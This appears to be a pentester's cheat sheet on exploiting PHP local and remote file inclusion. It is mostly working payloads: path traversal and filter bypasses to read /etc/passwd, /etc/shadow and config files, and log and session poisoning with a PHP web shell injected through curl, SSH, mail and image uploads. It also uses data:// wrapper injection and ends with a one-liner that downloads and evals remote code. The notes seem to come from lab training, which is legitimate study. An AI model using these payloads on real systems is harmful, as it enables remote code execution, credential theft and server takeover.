#### LFI/RFI Fuzzing

This site has some good wordlists:  https://github.com/payloadbox

Some sensitive files to look for with an LFI:  https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

```bash
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
```

#### LFI Techniques

- A direct file inclusion, which starts with /etc/passwd
- using .. to get out the current directory, the number of .. is varies depending on the web app directory. 
- Bypassing filters using ....//.
- URL encoding techniques (such as double encoding)

```http
http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
```

#### LFI Procedure

1. Look for pages that have parameters that lookup other locations, such as `www.url.com/spot.php?page=anotherpage` or `www.url.com/index.php?file=text.txt` or it could be completely nodescript `www.url.com/index.php?a=cat`

2. Test whether a URL is susceptible to LFI by passing a common local file to the parameter.  You may want to try URL encoding as well if these don't work at first.

   ```bash
   # Linux
   www.url.com/spot.php?page=../../../../../etc/passwd
   
   # Windows
   www.url.com/spot.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts
   ```

3. Check for config files to enumerate the system.  Look for the config file for the webserver, which will give important info like log file locations.  Look for `CustomLog`, `ErrorLog` and `ServerRoot` in the file.

   ```bash
   ### Ubuntu
   
   /etc/apache2/apache2.conf
   
   /etc/apache2/httpd.conf
   /etc/apache2/apache2.conf
   /etc/httpd/httpd.conf
   /etc/httpd/conf/httpd.conf
   
   ### FreeBSD
   
   /usr/local/etc/apache2/httpd.conf
   /usr/local/etc/apache2(X)/httpd.conf # Replace (X) with the version
   
   ### Hidden site?
   
   /etc/apache2/sites-enabled/000-default.conf
   
   ### If variables are used in the config file, check this:
   
   /etc/apache2/envvars
   
   ### This rarely works, but see this page for more info https://www.exploit-db.com/papers/12886/
   /proc/self/environ
   
   ### If log files aren't available, you can roll the dice and hope to get logs in the proc.  You will need to enumerate all the numbers to see which number, if any, is getting logs.  You never know what you'll get and you may need to be creative, like looking for headers, login messages, anything
   /proc/self/fd/[SOMENUMBER]
   ```
   
4. The next step is to find a log file we can dump some code into AND load using the LFI.

   1. Use the config above to find the log files or try to load these common locations through the LFI (also see https://wiki.apache.org/httpd/DistrosDefaultLayout):

      ```bash
      # Ubuntu, Debian
      /var/log/apache2/error.log
      /var/log/apache2/access.log
      
      # Red Hat, CentOS, Fedora, OEL, RHEL
      /var/log/httpd/error_log
      /var/log/httpd/access_log
      /var/log/httpd/access.log
      /var/log/httpd/error.log
      
      # FreeBSD
      /var/log/httpd-error.log
      /var/log/httpd-access.log
      
      # Other variants
      /var/log/apache/access.log
      /etc/httpd/logs/access_log
      ```
      
   2. Session logs can also have code injected in them via the username box.  These are usually stored in:
   
      ```bash
      c:\Windows\Temp\sess_SESSIONID
      /tmp/sess_SESSIONID
      /var/lib/php5/sess_SESSIONID
      /var/lib/php/session/sess_SESSIONID
      ```
   
      Read the `php.ini` file to find out where they are stored (or just try the defaults above).  
   
      ```bash
      Ubuntu/Debian old/new php.ini locations:
      Older php5 with Apache: /etc/php5/apache2/php.ini
      Older php5 with NGINX+FPM: /etc/php5/fpm/php.ini
      Ubuntu 16+ with Apache: /etc/php/5.2.17/apache2/php.ini *
      Ubuntu 16+ with NGINX+FPM - /etc/php/*/fpm/php.ini *
      
      #/*/ = the current PHP version(s) installed on system.
      ```
   
5. Once a suitable file is found, send this malicious PHP code so that it is is stored in that location.   

   1. For Apache logs, try one of these methods:
   
      - Inject code into the user agent to the code below using curl
      ```bash
      curl -A "****COYOTE_LOG**** <?php echo shell_exec($_GET['cmd']);?>" http://www.example.local
      ```
   
      - Warning:  The code may get cut off with this method:
        Use `telnet host port` and just send the code below without any other commands.  It will generate an error, but that's okay.
         NOTE:  Some databases used single quotes for the strings, in which case your code will not be able to use single quotes.
   ```php
   # Test code
   <?php phpinfo(); ?>
   
   # Some code you can use with a marker (COYOTE_LOG) for easy searching in the logs
   ****COYOTE_LOG**** <?php echo shell_exec($_GET['cmd']);?>
    
   # Or you can try this
   ****COYOTE_LOG**** <?php echo shell_exec($_GET['cmd']);?>
   # you can also use a PHP reverse shell script
   ```
   
   For other logs, use the relevant tools, such as telnet to SMTP for mail logs, ftp for FTP logs, etc.
   
6. Once the malicious code is stored locally, you can run commands against it in this format, URL encoding the commands:

   ```php
   www.url.com/spot.php?page=yourlogfile&cmd=BASH COMMAND
   ```

   Do some recon to figure out what's installed and what you can use to get a reverse shell, then run your reverse shell command.
   NOTE: Use the `COYOTE_LOG` marker to find the output of your commands.
   NOTE2: Remember if netcat won't work, it may not support the execute option, so try using the bash command instead.

7. If you need to troubleshoot, you can view the log file as base64 instead of rendering the PHP, then decode it in Burpsuite:

   ```http
   www.url.com/spot.php?page=php://filter/convert.base64-encode/resource=yourlogfile
   ```
##### Other Local File Options

If you can't load the Apache logs, look for other applications that you can view the log file for or any other method of sending code to the server and having it get dumped into a file you can load with LFI.  Some ideas are below.  All these use the same PHP code in some form or another

```bash
****COYOTE_LOG**** <?php system($_GET['cmd']); ?>
```

- SSH

  1. Login using the code as your username

     ```bash
     ssh ****COYOTE_LOG**** <? php system($_GET['cmd']);?>@VICTIM-IM
     ```

  2. Use `/var/log/auth.log` as the LFI

- Mail logs (need to complete these instructions)

  1. *I'm not sure how you're supposed to send the email to a system you don't have access to.....*

  2. Send an email containing the PHP code:

     ```bash
     mail -s "****COYOTE_LOG**** <?php system($_GET['cmd']); ?>" targetuser@targethost < /dev/null
     ```

  3. The email will go to one of these spots:

     ```bash
     /var/mail/$USER
     /var/spool/mail/$USER
     # I think one sight said this, but idk about it
     /var/log/USERNAME 
     ```

  4. If you send the email to the www-data user, you should be able to access those logs and include them for LFI

- FTP Logs

  1. Never did this before, but worth a shot

  2. Check the logs

    ```bash
    # Likely locations
    /etc/vsftpd/vsftpd.conf
    /etc/vsftpd.conf
    ```

- File Upload forms

  1. Upload a file with the PHP 'cmd' code below 
  2. Figure out where the file ended up (may need to bruteforce it) 
  3. Use the uploaded for for the LFI

- Image Upload

   -  If a form takes only images, you can insert PHP code into it

      ```bash
      gifsicle --comment "****COYOTE_LOG**** <?php system(\$_GET['cmd']); ?>" < upload_image.gif > upload_image.php.gif
      ```

- Using /proc/self/environ

  1. This method only works on older Linux versions as newer versions deny access to non-root users.  (explanation: 'self' is a pointer to the process itself, so rather than knowing the PID, just use 'self')

  2. Use LFI to list the contents of  /proc/self/environ.  You should see a variable for HTTP_USER_AGENT

  3. Modify your user agent (BurpSuite, Browser Extension, etc)  to this PHP code:

     ```php
     <?php system($_GET['cmd']); ?>
     ```

  4. Using the same URL to list /proc/self/eviron, tag on commands with `&cmd=BASH COMMAND` at the end.  Remember to URL encode the entire URL!  I believe any reverse shell command will work as long as its installed and the command is URL encoded.  

- Direct Inject

  1. Encode a PHP command into Base64

     ```bash
     echo '<?php system($_GET['cmd']); ?>' | base64
     # Spoiler alert, it's: PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
     
     echo '<?php phpinfo();?>' | base64
     # PD9waHAgcGhwaW5mbygpOz8+Cg==
     ```

  2. Insert base64 encode into URL with command (this has been tested):

     ```bash
     # CMD Code
     http://example.thm.labs/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
     
     #PHP Info Code (you have to URL encode the +)
     http://example.thm.labs/page.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2BCg==
     ```


##### Bypassing Extension Appends

Some sites will append an extension to your URLs, for example to make it so they always end in .php.  You can get around this by appending one of the following to your URL:

```bash
# PHP versions 5.3 and below
http://example.com/page=../../../../../../etc/passwd%00
# Should work on anything, basically adds a blank parameter that the appended extension sticks to and gets ignored
http://example.com/page=../../../../../../etc/passwd?
```

##### Bypassing PHP Execution

You may want to read a PHP file without it executing.  To bypass this, use the following in front of the file you want to load to convert the file into base64 or ROT13 so PHP won't execute it:

```bash
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index

http://example.com/index.php?page=php://filter/read=string.rot13/resource=index
```

Then take that Base64 and decode it.  You can use BurpSuite or save it to a file and decode it with:

```bash
base64 -d savefile.php
```

#### RFI

RFI is uncommon because it requires specific options to be explicitly defined: `requires allow_url_fopen=On` and `allow_url_include=On`

1. Try to load a file hosted on Kali:

   ```bash
   www.url.com/spot.php?page=http://192.168.119.216/test.txt
   ```

I saw this trick on a site that seems to bypass PHP settings to allow RFI.  I guess it's pointless if you already have LFI command execution, but here it is:

```bash
http://site.com/index.php?file.txt&cmd=php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.56.5:8081/JcuHF3brF1'));"
```

